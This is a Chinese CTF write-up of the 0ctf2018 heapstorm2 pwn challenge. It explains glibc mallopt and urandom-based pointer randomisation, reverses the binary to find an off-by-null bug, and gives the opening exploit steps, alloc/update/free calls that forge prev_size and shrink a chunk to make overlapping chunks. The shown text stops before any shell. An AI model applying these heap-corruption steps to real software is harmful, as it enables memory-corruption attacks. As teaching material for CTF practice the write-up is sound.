
# [原创]ctf pwn中的unsorted bin利用及chunk shrink——0ctf2018 heapstorm2 writeup

## 题目链接

<mark class="encrypted">6d4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2N6r3g2J5L8X3q4D9M7$3q4C8N6i4u0S2i4K6u0r3j5%4c8X3i4K6g2X3M7s2N6F1i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8U0m8U0N6r3j5J5x3o6p5^5i4K6u0r3K9r3g2S2M7s2y4@1L8%4u0E0x3R3`.`.</mark>

## 前置知识

- `mallopt`

`int mallopt(int param,int value)` `param`的取值分别为`M_MXFAST`，`value`是以字节为单位。

`M_MXFAST`:定义使用fastbins的内存请求大小的上限，小于该阈值的小块内存请求将不会使用fastbins获得内存，其缺省值为64。下面我们来将`M_MXFAST`设置为0，禁止使用fastbins

<a href="elink@95dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3c8W2i4K6u0W2N6$3!0T1L8%4q4Q4x3X3g2G2M7X3N6Q4x3V1k6#2M7$3g2J5M7%4m8S2j5$3g2Q4x3V1k6Y4L8r3W2T1j5#2)9J5c8X3#2S2L8r3I4G2j5#2)9J5c8X3#2S2L8r3I4G2j5#2)9J5k6h3S2Q4x3X3g2Z5N6r3#2D9">源码</a>

```c
102 #ifndef M\_MXFAST
103 # define M\_MXFAST 1 /\* maximum request size for "fastbins" \*/
104 #endif
5137 int \_\_libc\_mallopt (int param\_number, int value)
5138 {
5139 mstate av = &main\_arena;
5140 int res = 1;
5141
5142 if (\_\_malloc\_initialized < 0)
5143 ptmalloc\_init ();
5144 \_\_libc\_lock\_lock (av->mutex);
5145
5146 LIBC\_PROBE (memory\_mallopt, 2, param\_number, value);
5147
5148 /\* We must consolidate main arena before changing max\_fast
5149 (see definition of set\_max\_fast). \*/
5150 malloc\_consolidate (av);
5151
5152 switch (param\_number)
5153 {
5154 case M\_MXFAST:
5155 if (value >= 0 && value <= MAX\_FAST\_SIZE)
5156 {
5157 LIBC\_PROBE (memory\_mallopt\_mxfast, 2, value, get\_max\_fast ());
5158 set\_max\_fast (value);
5159 }
5160 else
5161 res = 0;
5162 break;
5163
5164 case M\_TRIM\_THRESHOLD:
5165 do\_set\_trim\_threshold (value);
5166 break;
5167
5168 case M\_TOP\_PAD:
5169 do\_set\_top\_pad (value);
5170 break;
5171
5172 case M\_MMAP\_THRESHOLD:
5173 res = do\_set\_mmap\_threshold (value);
5174 break;
5175
5176 case M\_MMAP\_MAX:
5177 do\_set\_mmaps\_max (value);
5178 break;
5179
5180 case M\_CHECK\_ACTION:
5181 do\_set\_mallopt\_check (value);
5182 break;
5183
5184 case M\_PERTURB:
5185 do\_set\_perturb\_byte (value);
5186 break;
5187
5188 case M\_ARENA\_TEST:
5189 if (value > 0)
5190 do\_set\_arena\_test (value);
5191 break;
5192
5193 case M\_ARENA\_MAX:
5194 if (value > 0)
5195 do\_set\_arena\_max (value);
5196 break;
5197 }
5198 \_\_libc\_lock\_unlock (av->mutex);
5199 return res;
5200 }
```

- 利用linux的`/dev/urandom`文件产生较好的随机数

<mark class="encrypted">69eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4@1M7r3g2S2j5$3g2Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0b7#2z5o6t1&6x3e0j5I4</mark>

```c
int randNum = 0;
int fd = open("/dev/urandom", O\_RDONLY);
if(-1 == fd)
{
printf("error\n");
return 1;
}
read(fd, (char \*)&randNum, sizeof(int));
close(fd);
```

## 分析

### checksec

```
parallels@ubuntu:~/ctf/0ctf2018/heapstorm2$ checksec heapstorm2
[\*] '/home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
```

### 程序分析

#### 关闭fastbin的分配

![图片描述](upload/attach/201902/93_3UMH7HF8FN2K2QW.png)

#### 对存放堆指针和size的地方进行随机化

![图片描述](upload/attach/201902/93_CFTYBSYCK27A2NW.png)

读入随机数前

```
pwndbg> b \*555555554000+0x0000000000000CA6
Breakpoint 1 at 0x8159b10f76
pwndbg> r
Starting program: /home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2
...
...
Breakpoint \*0x555555554000+0x0000000000000CA6
pwndbg> x /50gx 0x13370800
0x13370800: 0x0000000000000000 0x0000000000000000
0x13370810: 0x0000000000000000 0x0000000000000000
0x13370820: 0x0000000000000000 0x0000000000000000
0x13370830: 0x0000000000000000 0x0000000000000000
0x13370840: 0x0000000000000000 0x0000000000000000
0x13370850: 0x0000000000000000 0x0000000000000000
0x13370860: 0x0000000000000000 0x0000000000000000
0x13370870: 0x0000000000000000 0x0000000000000000
0x13370880: 0x0000000000000000 0x0000000000000000
0x13370890: 0x0000000000000000 0x0000000000000000
0x133708a0: 0x0000000000000000 0x0000000000000000
0x133708b0: 0x0000000000000000 0x0000000000000000
0x133708c0: 0x0000000000000000 0x0000000000000000
0x133708d0: 0x0000000000000000 0x0000000000000000
0x133708e0: 0x0000000000000000 0x0000000000000000
0x133708f0: 0x0000000000000000 0x0000000000000000
0x13370900: 0x0000000000000000 0x0000000000000000
0x13370910: 0x0000000000000000 0x0000000000000000
0x13370920: 0x0000000000000000 0x0000000000000000
0x13370930: 0x0000000000000000 0x0000000000000000
0x13370940: 0x0000000000000000 0x0000000000000000
0x13370950: 0x0000000000000000 0x0000000000000000
0x13370960: 0x0000000000000000 0x0000000000000000
0x13370970: 0x0000000000000000 0x0000000000000000
0x13370980: 0x0000000000000000 0x0000000000000000
```

读入随机数后

```
pwndbg> x /50gx 0x13370800
0x13370800: 0x72cec7f9b44fb49e 0x438137bc554b405e
0x13370810: 0x7a4f542a3248dba2 0x0000000000000000
0x13370820: 0x0000000000000000 0x0000000000000000
0x13370830: 0x0000000000000000 0x0000000000000000
0x13370840: 0x0000000000000000 0x0000000000000000
0x13370850: 0x0000000000000000 0x0000000000000000
```

![图片描述](upload/attach/201902/93_N2B76SW5NGZYAGS.png)

![图片描述](upload/attach/201902/93_X7SHTF3J3M3QQNW.png)

用如图上数字1处的随机数去覆盖后面的16个的每一行的左八个字节(堆指针)。用如图上数字2处的随机数去覆盖后面的16个的每一行的右八个字节(size)。

用图上数字3处的随机数去覆盖数字4处。

#### 主函数

![图片描述](upload/attach/201902/93_VSDVEX347A8UGCD.png)

#### 添加

![图片描述](upload/attach/201902/93_24KS6RGAU8CBYB4.png)

#### 更新

有off by null漏洞

![图片描述](upload/attach/201902/93_GNGMZVJJEKVEB88.png)

#### 删除

![图片描述](upload/attach/201902/93_PV56G64C5U44SWP.png)

#### 显示

![图片描述](upload/attach/201902/93_EXZH74DUN9BT7QD.png)

### 漏洞分析

在`update`的时候有一个off by null。

### 其他

之前做堆的题都不建结构体，全靠脑补…这次建一下，让反编译出来的好看一点。

1.添加segment

![图片描述](upload/attach/201902/93_CEX5QZD2JPB8EXS.png)

![图片描述](upload/attach/201902/93_GNBUSPXRS938YUZ.png)

![图片描述](upload/attach/201902/93_XDRMQ5398APFGB8.png)

![图片描述](upload/attach/201902/93_U78ZGMB76NKRCDM.png)

2.建结构体

![图片描述](upload/attach/201902/93_U5QCVTPMAK6PYYM.png)

3.改函数参数

![图片描述](upload/attach/201902/93_DAK56JY9MRQXBC9.png)

![图片描述](upload/attach/201902/93_GZNG2N443C6CKRF.png)

4.最后的修改结果

![图片描述](upload/attach/201902/93_29XXQ63PEC79VAZ.png)

## 利用

### shrink the chunk来overlap

前提：存在一个off-by-null漏洞（已满足）

目的：创造出overlap chunk，进而更改其他chunk中的内容

主要利用unsorted,small bin会unlink合并的特性来达到我们的目的。

1.伪造`prev_size`

```
alloc(0x18) #0
alloc(0x508) #1
alloc(0x18) #2
update(1, 'h'*0x4f0 + p64(0x500)) #set fake prev_size
alloc(0x18) #3
alloc(0x508) #4
alloc(0x18) #5
update(4, 'h'*0x4f0 + p64(0x500)) #set fake prev_size
alloc(0x18) #6
```

![图片描述](upload/attach/201902/93_MYHY9C2W2QTXUJH.png)

2.free 1,于是下一个chunk的inuse和prev_size将被设置。

图示灰色的地方代表被free掉，然后触发off by null，修改1的size。

```
free(1)
update(0, 'h'*(0x18-12)) #off-by-one
```

![图片描述](upload/attach/201902/93_RSDJZ4RS43VGN9W.png)

3.将free的1再分配出来,然后再分配一块空间到原来的1中，注意大小不能刚好使得这个chunk和2相邻，否则会把2的inuse位置1，不能在后续触发unlink。

然后再free 2，就能触发unlink，然后1和7，overlap

```
alloc(0x18) #1
alloc(0x4d8) #7
free(1)
free(2) #backward consolidate
```

![图片描述](upload/attach/201902/93_BJQZ3SS6MH6G46Z.png)

![图片描述](upload/attach/201902/93_TPBJBCW6SPBMPT2.png)
